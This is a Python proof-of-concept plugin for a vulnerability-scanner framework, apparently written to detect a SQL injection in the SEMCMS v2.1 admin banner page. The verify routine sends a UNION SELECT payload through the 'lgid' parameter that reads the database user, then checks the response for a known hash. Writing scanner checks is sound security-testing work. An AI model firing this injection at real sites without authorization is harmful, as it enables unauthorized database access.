# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'SEMCMS_0002_L'  # 平台漏洞编号，留空
    name = 'SEMCMS v2.1 后台注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2017-03-05'  # 漏洞公布时间
    desc = """
        SemCms是一套开源外贸企业网站管理系统,主要用于外贸企业,兼容IE、Firefox 、google、360 等主流浏览器。
        xxxx_Admin/SEMCMS_Banner.php
        对GET参数没有处理，直接注入。
    """  # 漏洞描述
    ref = 'http://0day5.com/archives/4320/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SEMCMS'  # 漏洞应用名称
    product_version = 'v2.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '11f6f094-f582-438d-98ad-3cb3364d0717'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 登录后台用户
            # 获取cookies
            s = requests.session()
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            '''
            payload = '/xdan_Admin/SEMCMS_Banner.php'
            url = self.target + payload
            s.get(url, cookies=cookies)
            verify_url = url + \
                "?lgid=1%20and%201=1%20union%20select%201,2,concat(user(),0xa3a,md5(c)),4,5,6,7#"
            r = s.get(verify_url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
